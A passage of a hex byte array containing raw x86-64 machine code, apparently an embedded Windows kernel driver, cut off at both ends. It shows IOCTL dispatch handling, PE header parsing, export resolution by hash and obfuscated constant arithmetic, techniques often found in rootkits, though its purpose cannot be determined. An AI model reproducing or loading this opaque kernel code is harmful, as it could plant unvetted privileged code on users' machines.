	0x8D, 0x05, 0xCA, 0x24, 0x00, 0x00, 0x48, 0x89, 0x05, 0xE3, 0x43, 0x00,
	0x00, 0x48, 0x8D, 0x05, 0xCC, 0x24, 0x00, 0x00, 0x48, 0x89, 0x05, 0xD5,
	0x43, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xCE, 0x24, 0x00, 0x00, 0x48, 0x89,
	0x05, 0xC7, 0x43, 0x00, 0x00, 0x8B, 0x04, 0x24, 0x35, 0x18, 0xD9, 0x00,
	0x00, 0x8B, 0x4C, 0x24, 0x04, 0x2B, 0xC8, 0x8B, 0xC1, 0x89, 0x44, 0x24,
	0x04, 0x8B, 0x04, 0x24, 0x8B, 0x4C, 0x24, 0x04, 0x03, 0xC8, 0x8B, 0xC1,
	0x89, 0x44, 0x24, 0x04, 0x8B, 0x04, 0x24, 0x83, 0xC0, 0x76, 0x89, 0x04,
	0x24, 0x8B, 0x05, 0x8D, 0x43, 0x00, 0x00, 0x03, 0x04, 0x24, 0x89, 0x05,
	0x84, 0x43, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x10, 0x83, 0xE0, 0xFE, 0x8B,
	0x4C, 0x24, 0x0C, 0x03, 0xC8, 0x8B, 0xC1, 0x89, 0x44, 0x24, 0x0C, 0x8B,
	0x04, 0x24, 0x8B, 0x4C, 0x24, 0x08, 0x03, 0xC8, 0x8B, 0xC1, 0x89, 0x44,
	0x24, 0x08, 0x8B, 0x05, 0x5C, 0x43, 0x00, 0x00, 0x03, 0x44, 0x24, 0x08,
	0x89, 0x05, 0x52, 0x43, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x04, 0x2D, 0xB7,
	0x03, 0x00, 0x00, 0x89, 0x44, 0x24, 0x04, 0x8B, 0x05, 0x3F, 0x43, 0x00,
	0x00, 0x03, 0x44, 0x24, 0x0C, 0x89, 0x05, 0x35, 0x43, 0x00, 0x00, 0x48,
	0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x83, 0xEC, 0x38, 0xC7, 0x44, 0x24, 0x04, 0xCF, 0x15, 0x4B, 0x78,
	0xC7, 0x44, 0x24, 0x14, 0x45, 0x7C, 0x8C, 0x18, 0xC7, 0x44, 0x24, 0x18,
	0xE7, 0xF5, 0x42, 0x50, 0xC7, 0x44, 0x24, 0x0C, 0x6A, 0x48, 0xEB, 0x8F,
	0xC7, 0x04, 0x24, 0x64, 0xCF, 0xE4, 0xCB, 0xC7, 0x44, 0x24, 0x08, 0xDA,
	0x0E, 0x6B, 0x56, 0xC7, 0x44, 0x24, 0x10, 0xE4, 0x93, 0x87, 0x86, 0xC7,
	0x44, 0x24, 0x1C, 0xDF, 0x6A, 0xB3, 0xB9, 0xC7, 0x44, 0x24, 0x20, 0xF0,
	0x23, 0xEB, 0x86, 0x48, 0x8D, 0x05, 0x6E, 0x19, 0x00, 0x00, 0x48, 0x89,
	0x05, 0xD7, 0x42, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x70, 0x19, 0x00, 0x00,
	0x48, 0x89, 0x05, 0xC9, 0x42, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x82, 0x19,
	0x00, 0x00, 0x48, 0x89, 0x05, 0xBB, 0x42, 0x00, 0x00, 0x48, 0x8D, 0x05,
	0x94, 0x19, 0x00, 0x00, 0x48, 0x89, 0x05, 0xAD, 0x42, 0x00, 0x00, 0x48,
	0x8D, 0x05, 0xA6, 0x19, 0x00, 0x00, 0x48, 0x89, 0x05, 0x9F, 0x42, 0x00,
	0x00, 0x48, 0x8D, 0x05, 0xC8, 0x19, 0x00, 0x00, 0x48, 0x89, 0x05, 0x91,
	0x42, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x04, 0x35, 0x02, 0x7F, 0x00, 0x00,
	0x8B, 0x4C, 0x24, 0x08, 0x2B, 0xC8, 0x8B, 0xC1, 0x89, 0x44, 0x24, 0x08,
	0x8B, 0x44, 0x24, 0x10, 0x8B, 0x0C, 0x24, 0x03, 0xC8, 0x8B, 0xC1, 0x89,
	0x04, 0x24, 0x8B, 0x44, 0x24, 0x04, 0x35, 0x96, 0xC5, 0x00, 0x00, 0x8B,
	0x4C, 0x24, 0x0C, 0x2B, 0xC8, 0x8B, 0xC1, 0x89, 0x44, 0x24, 0x0C, 0x8B,
	0x04, 0x24, 0x05, 0xD2, 0x01, 0x00, 0x00, 0x89, 0x04, 0x24, 0x48, 0x8D,
	0x05, 0x97, 0x19, 0x00, 0x00, 0x48, 0x89, 0x05, 0x40, 0x42, 0x00, 0x00,
	0x48, 0x8D, 0x05, 0x99, 0x19, 0x00, 0x00, 0x48, 0x89, 0x05, 0x32, 0x42,
	0x00, 0x00, 0x48, 0x8D, 0x05, 0xAB, 0x19, 0x00, 0x00, 0x48, 0x89, 0x05,
	0x24, 0x42, 0x00, 0x00, 0x8B, 0x05, 0x16, 0x42, 0x00, 0x00, 0x03, 0x44,
	0x24, 0x10, 0x89, 0x05, 0x0C, 0x42, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x9D,
	0x19, 0x00, 0x00, 0x48, 0x89, 0x05, 0x06, 0x42, 0x00, 0x00, 0x8B, 0x44,
	0x24, 0x14, 0x35, 0x06, 0xC4, 0x00, 0x00, 0x8B, 0x4C, 0x24, 0x04, 0x2B,
	0xC8, 0x8B, 0xC1, 0x89, 0x44, 0x24, 0x04, 0x48, 0x83, 0xC4, 0x38, 0xC3,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x56, 0x57,
	0x48, 0x83, 0xEC, 0x78, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00,
	0xC7, 0x44, 0x24, 0x34, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8C, 0x24,
	0x98, 0x00, 0x00, 0x00, 0xE8, 0x53, 0x06, 0x00, 0x00, 0x48, 0x89, 0x44,
	0x24, 0x48, 0x48, 0x83, 0x7C, 0x24, 0x48, 0x00, 0x75, 0x39, 0x48, 0x8B,
	0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0xC7, 0x40, 0x30, 0x0D, 0x00, 0x00,
	0xC0, 0x48, 0x8B, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x40,
	0x38, 0x00, 0x00, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8B, 0x8C, 0x24, 0x98,
	0x00, 0x00, 0x00, 0xFF, 0x15, 0x27, 0x30, 0x00, 0x00, 0xB8, 0x0D, 0x00,
	0x00, 0xC0, 0xE9, 0x1F, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x48,
	0x8B, 0x40, 0x18, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8B, 0x44, 0x24, 0x48,
	0x8B, 0x40, 0x10, 0x89, 0x44, 0x24, 0x3C, 0x81, 0x7C, 0x24, 0x38, 0xC4,
	0x02, 0x22, 0x00, 0x75, 0x62, 0x8B, 0x44, 0x24, 0x3C, 0x48, 0x83, 0xF8,
	0x28, 0x75, 0x43, 0x48, 0x8B, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x40, 0x18, 0x48, 0x89, 0x44, 0x24, 0x50, 0x48, 0x83, 0x7C, 0x24,
	0x50, 0x00, 0x74, 0x18, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0xE8, 0x6E, 0xDF,
	0xFF, 0xFF, 0x89, 0x44, 0x24, 0x30, 0xC7, 0x44, 0x24, 0x34, 0x28, 0x00,
	0x00, 0x00, 0xEB, 0x10, 0xC7, 0x44, 0x24, 0x30, 0x0D, 0x00, 0x00, 0xC0,
	0xC7, 0x44, 0x24, 0x34, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x10, 0xC7, 0x44,
	0x24, 0x30, 0x04, 0x00, 0x00, 0xC0, 0xC7, 0x44, 0x24, 0x34, 0x00, 0x00,
	0x00, 0x00, 0xE9, 0x30, 0x01, 0x00, 0x00, 0x81, 0x7C, 0x24, 0x38, 0xC8,
	0x02, 0x22, 0x00, 0x75, 0x62, 0x8B, 0x44, 0x24, 0x3C, 0x48, 0x83, 0xF8,
	0x10, 0x75, 0x43, 0x48, 0x8B, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x40, 0x18, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x83, 0x7C, 0x24,
	0x58, 0x00, 0x74, 0x18, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0xE8, 0x02, 0xB5,
	0xFF, 0xFF, 0x89, 0x44, 0x24, 0x30, 0xC7, 0x44, 0x24, 0x34, 0x10, 0x00,
	0x00, 0x00, 0xEB, 0x10, 0xC7, 0x44, 0x24, 0x30, 0x0D, 0x00, 0x00, 0xC0,
	0xC7, 0x44, 0x24, 0x34, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x10, 0xC7, 0x44,
	0x24, 0x30, 0x04, 0x00, 0x00, 0xC0, 0xC7, 0x44, 0x24, 0x34, 0x00, 0x00,
	0x00, 0x00, 0xE9, 0xC4, 0x00, 0x00, 0x00, 0x81, 0x7C, 0x24, 0x38, 0x84,
	0x02, 0x22, 0x00, 0x0F, 0x85, 0xA6, 0x00, 0x00, 0x00, 0x8B, 0x44, 0x24,
	0x3C, 0x48, 0x83, 0xF8, 0x10, 0x0F, 0x85, 0x86, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48,
	0x89, 0x44, 0x24, 0x40, 0x48, 0x83, 0x7C, 0x24, 0x40, 0x00, 0x74, 0x5B,
	0x48, 0x8D, 0x44, 0x24, 0x60, 0x48, 0x8D, 0x0D, 0x24, 0x40, 0x00, 0x00,
	0x48, 0x8B, 0xF8, 0x48, 0x8B, 0xF1, 0xB9, 0x10, 0x00, 0x00, 0x00, 0xF3,
	0xA4, 0x48, 0x8B, 0x44, 0x24, 0x40, 0x8B, 0x40, 0x0C, 0x89, 0x44, 0x24,
	0x20, 0x48, 0x8B, 0x44, 0x24, 0x40, 0x44, 0x0F, 0xB7, 0x48, 0x08, 0x48,
	0x8B, 0x44, 0x24, 0x40, 0x44, 0x8B, 0x40, 0x04, 0x48, 0x8B, 0x44, 0x24,
	0x40, 0x8B, 0x10, 0x48, 0x8D, 0x4C, 0x24, 0x60, 0xE8, 0x2F, 0xE2, 0xFF,
	0xFF, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24,
	0x34, 0x10, 0x00, 0x00, 0x00, 0xEB, 0x10, 0xC7, 0x44, 0x24, 0x30, 0x0D,
	0x00, 0x00, 0xC0, 0xC7, 0x44, 0x24, 0x34, 0x00, 0x00, 0x00, 0x00, 0xEB,
	0x10, 0xC7, 0x44, 0x24, 0x30, 0x04, 0x00, 0x00, 0xC0, 0xC7, 0x44, 0x24,
	0x34, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x10, 0xC7, 0x44, 0x24, 0x30, 0x10,
	0x00, 0x00, 0xC0, 0xC7, 0x44, 0x24, 0x34, 0x00, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x8B, 0x4C, 0x24, 0x30, 0x89,
	0x48, 0x30, 0x8B, 0x44, 0x24, 0x34, 0x48, 0x8B, 0x8C, 0x24, 0x98, 0x00,
	0x00, 0x00, 0x48, 0x89, 0x41, 0x38, 0x33, 0xD2, 0x48, 0x8B, 0x8C, 0x24,
	0x98, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x3A, 0x2E, 0x00, 0x00, 0x8B, 0x44,
	0x24, 0x30, 0xEB, 0x36, 0x48, 0x8B, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00,
	0xC7, 0x40, 0x30, 0x01, 0x00, 0x00, 0xC0, 0x48, 0x8B, 0x84, 0x24, 0x98,
	0x00, 0x00, 0x00, 0x48, 0xC7, 0x40, 0x38, 0x00, 0x00, 0x00, 0x00, 0x33,
	0xD2, 0x48, 0x8B, 0x8C, 0x24, 0x98, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x05,
	0x2E, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00, 0xC0, 0xEB, 0x00, 0x48, 0x83,
	0xC4, 0x78, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x58, 0x48, 0x8B, 0x44,
	0x24, 0x60, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8B, 0x44, 0x24, 0x28,
	0x0F, 0xB7, 0x00, 0x3D, 0x4D, 0x5A, 0x00, 0x00, 0x74, 0x07, 0x32, 0xC0,
	0xE9, 0xA1, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x48, 0x63,
	0x40, 0x3C, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x48, 0x03, 0xC8, 0x48, 0x8B,
	0xC1, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x81,
	0x38, 0x50, 0x45, 0x00, 0x00, 0x74, 0x04, 0x32, 0xC0, 0xEB, 0x77, 0x48,
	0x8B, 0x44, 0x24, 0x20, 0x0F, 0xB7, 0x40, 0x04, 0x3D, 0x64, 0x86, 0x00,
	0x00, 0x74, 0x04, 0x32, 0xC0, 0xEB, 0x63, 0xB8, 0x08, 0x00, 0x00, 0x00,
	0x48, 0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x20, 0x8B, 0x84, 0x01,
	0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x48, 0x03, 0xC8,
	0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x44, 0x24,
	0x30, 0x8B, 0x40, 0x0C, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x48, 0x03, 0xC8,
	0x48, 0x8B, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8B, 0x4C, 0x24,
	0x38, 0xE8, 0x92, 0xAE, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48,
	0xB8, 0xF0, 0xDB, 0xF3, 0x64, 0x01, 0xF7, 0xE7, 0x9B, 0x48, 0x39, 0x44,
	0x24, 0x40, 0x74, 0x04, 0x32, 0xC0, 0xEB, 0x02, 0xB0, 0x01, 0x48, 0x83,
	0xC4, 0x58, 0xC3, 0xCC, 0x44, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89, 0x54,
	0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x48, 0x48,
	0x8B, 0x44, 0x24, 0x50, 0x48, 0x89, 0x44, 0x24, 0x18, 0x48, 0x8B, 0x44,
	0x24, 0x58, 0x48, 0x89, 0x44, 0x24, 0x10, 0xC7, 0x04, 0x24, 0x00, 0x00,
	0x00, 0x00, 0xEB, 0x08, 0x8B, 0x04, 0x24, 0xFF, 0xC0, 0x89, 0x04, 0x24,
	0x8B, 0x04, 0x24, 0x48, 0x89, 0x44, 0x24, 0x20, 0x8B, 0x4C, 0x24, 0x60,
	0x33, 0xD2, 0x8B, 0xC1, 0xB9, 0x04, 0x00, 0x00, 0x00, 0x48, 0xF7, 0xF1,
	0x48, 0x8B, 0x4C, 0x24, 0x20, 0x48, 0x3B, 0xC8, 0x73, 0x34, 0x48, 0x8B,
	0x44, 0x24, 0x10, 0x8B, 0x00, 0x89, 0x44, 0x24, 0x08, 0x48, 0x8B, 0x44,
	0x24, 0x10, 0x48, 0x83, 0xC0, 0x04, 0x48, 0x89, 0x44, 0x24, 0x10, 0x48,
	0x8B, 0x44, 0x24, 0x18, 0x8B, 0x4C, 0x24, 0x08, 0x89, 0x08, 0x48, 0x8B,
	0x44, 0x24, 0x18, 0x48, 0x83, 0xC0, 0x04, 0x48, 0x89, 0x44, 0x24, 0x18,
	0xEB, 0xA2, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x83, 0xE0, 0x03, 0x89, 0x44,
	0x24, 0x04, 0x83, 0x7C, 0x24, 0x04, 0x00, 0x74, 0x50, 0x48, 0x8B, 0x44,
	0x24, 0x50, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8B, 0x44, 0x24, 0x58,
	0x48, 0x89, 0x44, 0x24, 0x30, 0x8B, 0x44, 0x24, 0x04, 0x8B, 0x4C, 0x24,
	0x60, 0x2B, 0xC8, 0x8B, 0xC1, 0x89, 0x04, 0x24, 0xEB, 0x08, 0x8B, 0x04,
	0x24, 0xFF, 0xC0, 0x89, 0x04, 0x24, 0x8B, 0x44, 0x24, 0x60, 0x39, 0x04,
	0x24, 0x73, 0x1A, 0x8B, 0x04, 0x24, 0x8B, 0x0C, 0x24, 0x48, 0x8B, 0x54,
	0x24, 0x28, 0x4C, 0x8B, 0x44, 0x24, 0x30, 0x41, 0x0F, 0xB6, 0x04, 0x00,
	0x88, 0x04, 0x0A, 0xEB, 0xD5, 0x48, 0x83, 0xC4, 0x48, 0xC3, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x54, 0x24,
	0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x81, 0xEC, 0xA8, 0x00, 0x00,
	0x00, 0x48, 0x8B, 0x84, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44,
	0x24, 0x28, 0x48, 0x8B, 0x84, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x89,
	0x44, 0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x0F, 0xBE, 0x00, 0x85,
	0xC0, 0x75, 0x0F, 0x48, 0x8B, 0x84, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x50, 0xEB, 0x09, 0x48, 0xC7, 0x44, 0x24, 0x50, 0x00,
	0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x50, 0x48, 0x89, 0x44, 0x24,
	0x30, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x0F, 0xBE, 0x00, 0x85, 0xC0, 0x0F,
	0x84, 0x76, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x0F, 0xBE,
	0x00, 0x85, 0xC0, 0x0F, 0x84, 0x66, 0x01, 0x00, 0x00, 0xE8, 0xA2, 0xA8,
	0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x70, 0x48, 0x8B, 0x44, 0x24, 0x28,
	0x0F, 0xB6, 0x00, 0x89, 0x44, 0x24, 0x3C, 0xE8, 0x8C, 0xA8, 0xFF, 0xFF,
	0x48, 0x89, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x0F, 0xB6,
	0x00, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x89,
	0x44, 0x24, 0x68, 0x8B, 0x4C, 0x24, 0x38, 0x48, 0x8B, 0x44, 0x24, 0x68,
	0xFF, 0x15, 0xBA, 0x2B, 0x00, 0x00, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8B,
	0x4C, 0x24, 0x70, 0x48, 0x89, 0x4C, 0x24, 0x78, 0x8B, 0x4C, 0x24, 0x3C,
	0x48, 0x8B, 0x44, 0x24, 0x78, 0xFF, 0x15, 0x9D, 0x2B, 0x00, 0x00, 0x8B,
	0x4C, 0x24, 0x40, 0x3B, 0xC1, 0x75, 0x24, 0x48, 0x83, 0x7C, 0x24, 0x30,
	0x00, 0x75, 0x0A, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x48, 0x89, 0x44, 0x24,
	0x30, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0xFF, 0xC0, 0x48, 0x89, 0x44,
	0x24, 0x20, 0xE9, 0xC6, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xB8,
	0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x83, 0x7C, 0x24,
	0x30, 0x00, 0x74, 0x0D, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48, 0xFF, 0xC0,
	0x48, 0x89, 0x44, 0x24, 0x28, 0xE8, 0xF2, 0xA7, 0xFF, 0xFF, 0x48, 0x89,
	0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x0F,
	0xB6, 0x00, 0x89, 0x44, 0x24, 0x48, 0xE8, 0xD9, 0xA7, 0xFF, 0xFF, 0x48,
	0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x20,
	0x0F, 0xB6, 0x00, 0x89, 0x44, 0x24, 0x44, 0x48, 0x8B, 0x84, 0x24, 0x80,
	0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x8B,
	0x4C, 0x24, 0x44, 0x48, 0x8B, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0xFF,
	0x15, 0xFB, 0x2A, 0x00, 0x00, 0x89, 0x44, 0x24, 0x4C, 0x48, 0x8B, 0x8C,
	0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x89, 0x8C, 0x24, 0x98, 0x00, 0x00,
	0x00, 0x8B, 0x4C, 0x24, 0x48, 0x48, 0x8B, 0x84, 0x24, 0x98, 0x00, 0x00,
	0x00, 0xFF, 0x15, 0xD5, 0x2A, 0x00, 0x00, 0x8B, 0x4C, 0x24, 0x4C, 0x3B,
	0xC1, 0x75, 0x19, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x48, 0x89, 0x44, 0x24,
	0x30, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0xFF, 0xC0, 0x48, 0x89, 0x44,
	0x24, 0x20, 0xEB, 0x09, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00,
	0x00, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x48, 0xFF, 0xC0, 0x48, 0x89, 0x44,
	0x24, 0x28, 0xE9, 0x7A, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x44, 0x24, 0x20,
	0x0F, 0xBE, 0x00, 0x85, 0xC0, 0x75, 0x0C, 0x48, 0x8B, 0x44, 0x24, 0x30,
	0x48, 0x89, 0x44, 0x24, 0x58, 0xEB, 0x09, 0x48, 0xC7, 0x44, 0x24, 0x58,
	0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x58, 0x48, 0x81, 0xC4,
	0xA8, 0x00, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x4C, 0x24,
	0x08, 0x48, 0x8B, 0x44, 0x24, 0x08, 0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00,
	0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0x01, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x8D, 0x15, 0xB1, 0x2E, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xAA, 0x2E,
	0x00, 0x00, 0x48, 0x2B, 0xCA, 0x48, 0x2B, 0xC2, 0x48, 0x3B, 0xC8, 0x77,
	0x01, 0xCC, 0xC3, 0xCC, 0x48, 0x8D, 0x15, 0x95, 0x2E, 0x00, 0x00, 0x48,
	0x8D, 0x05, 0x8E, 0x2E, 0x00, 0x00, 0x48, 0x2B, 0xCA, 0x48, 0x2B, 0xC2,
	0x48, 0x3B, 0xC8, 0x77, 0x07, 0xB9, 0x41, 0x00, 0x00, 0x00, 0xCD, 0x29,
	0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xC2, 0x00, 0x00, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x4C, 0x8D, 0x05, 0x61,
	0x2E, 0x00, 0x00, 0x48, 0x8B, 0xC1, 0x48, 0x8D, 0x15, 0x57, 0x2E, 0x00,
	0x00, 0x49, 0x2B, 0xC0, 0x49, 0x2B, 0xD0, 0x48, 0x3B, 0xC2, 0x77, 0x18,
	0x48, 0x8B, 0x05, 0xED, 0x29, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x0C,
	0x48, 0x8B, 0x05, 0xE1, 0x29, 0x00, 0x00, 0xFF, 0xD0, 0x0F, 0x1F, 0x00,
	0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28,
	0x48, 0x8B, 0x05, 0xC9, 0x29, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x0C,
	0x48, 0x8B, 0x05, 0xBD, 0x29, 0x00, 0x00, 0xFF, 0xD0, 0x0F, 0x1F, 0x00,
	0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x8D, 0x05, 0x01,
	0x2E, 0x00, 0x00, 0x48, 0x2B, 0xC8, 0x48, 0x8D, 0x15, 0xF7, 0x2D, 0x00,
	0x00, 0x48, 0x2B, 0xD0, 0x33, 0xC0, 0x48, 0x3B, 0xCA, 0x0F, 0x96, 0xC0,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xC1, 0x48, 0x2B, 0xC2, 0x48, 0x8D,
	0x15, 0x5B, 0x2D, 0x00, 0x00, 0x48, 0x2B, 0xC2, 0x48, 0x83, 0xC0, 0x80,
	0x49, 0x3B, 0xC0, 0x76, 0x1A, 0x48, 0x8D, 0x15, 0xC8, 0x2D, 0x00, 0x00,
	0x48, 0x8D, 0x05, 0xC1, 0x2D, 0x00, 0x00, 0x48, 0x2B, 0xCA, 0x48, 0x2B,
	0xC2, 0x48, 0x3B, 0xC8, 0x77, 0x01, 0xCC, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x8B, 0xC1, 0x48, 0x2B, 0xC2, 0x48, 0x8D, 0x15, 0x23, 0x2D, 0x00,
	0x00, 0x48, 0x2B, 0xC2, 0x48, 0x83, 0xC0, 0x80, 0x49, 0x3B, 0xC0, 0x76,
	0x20, 0x48, 0x8D, 0x15, 0x90, 0x2D, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x89,
	0x2D, 0x00, 0x00, 0x48, 0x2B, 0xCA, 0x48, 0x2B, 0xC2, 0x48, 0x3B, 0xC8,
	0x77, 0x07, 0xB9, 0x41, 0x00, 0x00, 0x00, 0xCD, 0x29, 0xC3, 0xCC, 0xCC,
	0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0xC1, 0x48, 0x2B, 0xC2, 0x48, 0x8D,
	0x15, 0xE3, 0x2C, 0x00, 0x00, 0x48, 0x2B, 0xC2, 0x48, 0x83, 0xC0, 0x80,
	0x49, 0x3B, 0xC0, 0x76, 0x34, 0x4C, 0x8D, 0x05, 0x50, 0x2D, 0x00, 0x00,
	0x48, 0x8B, 0xD1, 0x48, 0x8D, 0x05, 0x46, 0x2D, 0x00, 0x00, 0x49, 0x2B,
	0xD0, 0x49, 0x2B, 0xC0, 0x48, 0x3B, 0xD0, 0x77, 0x18, 0x48, 0x8B, 0x05,
	0xDC, 0x28, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x0C, 0x48, 0x8B, 0x05,
	0xD0, 0x28, 0x00, 0x00, 0xFF, 0xD0, 0x0F, 0x1F, 0x00, 0x48, 0x83, 0xC4,
	0x28, 0xC3, 0xCC, 0xCC, 0x48, 0x2B, 0xCA, 0x48, 0x8D, 0x05, 0x92, 0x2C,
	0x00, 0x00, 0x48, 0x2B, 0xC8, 0x33, 0xC0, 0x48, 0x83, 0xC1, 0x80, 0x49,
	0x3B, 0xC8, 0x0F, 0x97, 0xC0, 0xC3, 0xCC, 0xCC, 0x48, 0x8B, 0x0D, 0x79,
	0x28, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x82, 0xFE, 0xFF, 0xFF, 0x33, 0xC0,
	0x48, 0x3B, 0xCA, 0x0F, 0x95, 0xC0, 0xC3, 0xCC, 0x33, 0xC0, 0xC3, 0xCC,
	0x8B, 0xC9, 0xCD, 0x29, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xB9, 0x02, 0x00, 0x00,
	0x00, 0xCD, 0x29, 0xCC, 0xB9, 0x08, 0x00, 0x00, 0x00, 0xCD, 0x29, 0xCC,
	0x8B, 0xC9, 0xCD, 0x29, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xFF, 0x25, 0xAA, 0x27, 0x00, 0x00, 0xFF, 0x25,
